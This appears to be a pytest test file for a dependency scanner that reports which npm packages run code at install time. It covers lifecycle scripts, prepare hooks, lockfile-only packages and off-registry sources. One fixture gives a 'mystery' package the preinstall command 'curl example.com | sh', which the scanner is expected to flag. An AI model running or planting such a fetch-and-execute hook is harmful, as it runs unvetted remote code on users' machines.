"""The npm half: package.json, the lockfile, and node_modules."""

from __future__ import annotations

import json
from pathlib import Path

from assurance_deps.npm import read_direct_dependencies
from assurance_deps.report import format_report, report_to_dict
from assurance_deps.scan import scan_manifest


def _project(root: Path, *, deps: dict[str, str] | None = None, lock: dict[str, object] | None = None,
             installed: dict[str, dict[str, object]] | None = None) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "package.json").write_text(
        json.dumps({"name": "app", "version": "1.0.0", "dependencies": deps or {}}), encoding="utf-8"
    )
    if lock is not None:
        (root / "package-lock.json").write_text(
            json.dumps({"lockfileVersion": 3, "packages": lock}), encoding="utf-8"
        )
    for name, manifest in (installed or {}).items():
        folder = root / "node_modules" / name
        folder.mkdir(parents=True, exist_ok=True)
        (folder / "package.json").write_text(json.dumps(manifest), encoding="utf-8")
    return root / "package.json"


def test_lifecycle_scripts_are_named_with_the_command_they_run(tmp_path: Path) -> None:
    manifest = _project(
        tmp_path / "app",
        deps={"sharp": "0.33.0"},
        lock={"": {"name": "app"}, "node_modules/sharp": {"version": "0.33.0", "hasInstallScript": True}},
        installed={"sharp": {"name": "sharp", "version": "0.33.0",
                             "scripts": {"install": "node install/check.js", "postinstall": "echo done"}}},
    )
    report = scan_manifest(manifest)
    hooked = report.runs_at_install[0]
    assert hooked.name == "sharp"
    assert {h.where for h in hooked.hooks} == {"scripts.install", "scripts.postinstall"}
    assert "node install/check.js" in format_report(report)


def test_a_gypfile_means_a_compiler_runs(tmp_path: Path) -> None:
    manifest = _project(
        tmp_path / "app", deps={"native-thing": "1.0.0"},
        lock={"": {"name": "app"}, "node_modules/native-thing": {"version": "1.0.0"}},
        installed={"native-thing": {"name": "native-thing", "version": "1.0.0", "gypfile": True}},
    )
    hooks = scan_manifest(manifest).runs_at_install[0].hooks
    assert "node-gyp" in hooks[0].what


def test_the_lockfile_answers_for_packages_that_are_not_installed(tmp_path: Path) -> None:
    """npm skips optional platform packages on purpose; a 28-package tree can be 25 of them.

    Calling those a coverage gap overstates it as badly as calling them read overstates the read.
    The lockfile does say whether each has an install script, and that is a real answer.
    """
    manifest = _project(
        tmp_path / "app", deps={"esbuild": "0.28.0"},
        lock={
            "": {"name": "app"},
            "node_modules/esbuild": {"version": "0.28.0", "hasInstallScript": True},
            "node_modules/@esbuild/linux-x64": {"version": "0.28.0", "optional": True},
            "node_modules/@esbuild/win32-x64": {"version": "0.28.0", "optional": True},
        },
        installed={"esbuild": {"name": "esbuild", "version": "0.28.0",
                               "scripts": {"postinstall": "node install.js"}}},
    )
    report = scan_manifest(manifest)
    assert report.examined == 1
    assert {e.name for e in report.partial} == {"@esbuild/linux-x64", "@esbuild/win32-x64"}
    assert report.unexamined == ()
    # Known-from-the-lockfile is not read, so the folder is not complete.
    assert report.complete is False
    text = format_report(report)
    assert "2 known from the lockfile only" in text
    assert "none of them declares one" in text


def test_a_lockfile_only_package_that_declares_a_script_is_named(tmp_path: Path) -> None:
    manifest = _project(
        tmp_path / "app", deps={"thing": "1.0.0"},
        lock={"": {"name": "app"}, "node_modules/thing": {"version": "1.0.0", "hasInstallScript": True}},
    )
    report = scan_manifest(manifest)
    assert [e.name for e in report.partial] == ["thing"]
    assert "declares an install script" in format_report(report)
    assert report_to_dict(report)["lockfile_only"][0]["declares_install_script"] is True


def test_off_registry_specs_are_classified(tmp_path: Path) -> None:
    direct, why = read_direct_dependencies(
        _project(
            tmp_path / "app",
            deps={
                "pinned": "1.2.3",
                "ranged": "^2.0.0",
                "from-git": "git+https://github.com/o/r.git#v1.0.0",
                "moving": "git+https://github.com/o/r.git",
                "shorthand": "owner/repo",
                "tarball": "https://example.com/x.tgz",
                "local": "file:../sibling",
            },
        )
    )
    assert not why
    by = {r.name: r for r in direct}
    assert by["pinned"].source == "registry" and by["pinned"].version == "1.2.3"
    assert "is a range" in by["ranged"].note
    assert by["from-git"].source == "git" and not by["from-git"].note
    assert "can change" in by["moving"].note
    assert by["shorthand"].source == "git"
    assert by["tarball"].source == "url"
    assert by["local"].source == "local"


def test_a_package_in_node_modules_that_the_lockfile_never_mentions_is_named(tmp_path: Path) -> None:
    """It is in the tree and nothing recorded how it got there, which is worth a sentence."""
    manifest = _project(
        tmp_path / "app", deps={}, lock={"": {"name": "app"}},
        installed={"mystery": {"name": "mystery", "version": "9.9.9",
                               "scripts": {"preinstall": "curl example.com | sh"}}},
    )
    report = scan_manifest(manifest)
    found = {e.name: e for e in report.examined_archives}
    assert "mystery" in found
    assert "not in the lockfile" in found["mystery"].note
    assert "curl example.com | sh" in format_report(report)


def test_no_lockfile_is_said_rather_than_resolved(tmp_path: Path) -> None:
    manifest = _project(tmp_path / "app", deps={"a": "^1.0.0"})
    report = scan_manifest(manifest)
    assert "was not resolved" in report.no_lock
    assert "was not resolved" in format_report(report)


def test_a_malformed_package_json_is_exit_two_not_a_traceback(tmp_path: Path) -> None:
    from assurance_deps.cli import main

    root = tmp_path / "app"
    root.mkdir()
    (root / "package.json").write_text("{ not json", encoding="utf-8")
    assert main([str(root / "package.json")]) == 2


def test_prepare_counts_as_a_lifecycle_script(tmp_path: Path) -> None:
    """`prepare` is the one people forget.

    It runs on a plain `npm install`, on `npm ci`, and on any git dependency — where it is how a
    package that ships no build output gets built on your machine. A list of install hooks that
    stops at postinstall misses it.
    """
    manifest = _project(
        tmp_path / "app", deps={"built-from-git": "git+https://github.com/o/r.git#v1"},
        lock={"": {"name": "app"}, "node_modules/built-from-git": {"version": "1.0.0"}},
        installed={"built-from-git": {"name": "built-from-git", "version": "1.0.0",
                                      "scripts": {"prepare": "npm run build", "test": "jest"}}},
    )
    report = scan_manifest(manifest)
    hooked = report.runs_at_install[0]
    assert [h.where for h in hooked.hooks] == ["scripts.prepare"], "prepare in, test out"
    assert "npm run build" in format_report(report)


def test_prepare_on_a_registry_tarball_is_not_install_time_code(tmp_path: Path) -> None:
    """npm does not run `prepare` for a package it installs from a registry tarball.

    Found 2026-09-24 on a real project (esbuild, sharp, @modelcontextprotocol/sdk): six packages were
    reported as executing at install, four of them registry dependencies whose only script was
    `prepare`. npm's own `hasInstallScript` flagged two, and it was right.
    """
    manifest = _project(
        tmp_path / "app", deps={"express-rate-limit": "7.5.1"},
        lock={"": {"name": "app"}, "node_modules/express-rate-limit": {
            "version": "7.5.1",
            "resolved": "https://registry.npmjs.org/express-rate-limit/-/express-rate-limit-7.5.1.tgz",
        }},
        installed={"express-rate-limit": {"name": "express-rate-limit", "version": "7.5.1",
                                          "scripts": {"prepare": "run-s compile && husky install"}}},
    )
    assert scan_manifest(manifest).runs_at_install == ()


def test_a_registry_package_keeps_its_real_install_scripts(tmp_path: Path) -> None:
    manifest = _project(
        tmp_path / "app", deps={"esbuild": "0.23.1"},
        lock={"": {"name": "app"}, "node_modules/esbuild": {
            "version": "0.23.1", "hasInstallScript": True,
            "resolved": "https://registry.npmjs.org/esbuild/-/esbuild-0.23.1.tgz",
        }},
        installed={"esbuild": {"name": "esbuild", "version": "0.23.1",
                               "scripts": {"postinstall": "node install.js", "prepare": "make"}}},
    )
    hooked = scan_manifest(manifest).runs_at_install
    assert [h.where for h in hooked[0].hooks] == ["scripts.postinstall"]


def test_prepare_on_a_git_source_still_counts(tmp_path: Path) -> None:
    manifest = _project(
        tmp_path / "app", deps={"from-git": "github:o/r"},
        lock={"": {"name": "app"}, "node_modules/from-git": {
            "version": "1.0.0", "resolved": "git+ssh://git@github.com/o/r.git#0123abcd",
        }},
        installed={"from-git": {"name": "from-git", "version": "1.0.0", "scripts": {"prepare": "tsc"}}},
    )
    assert [h.where for h in scan_manifest(manifest).runs_at_install[0].hooks] == ["scripts.prepare"]
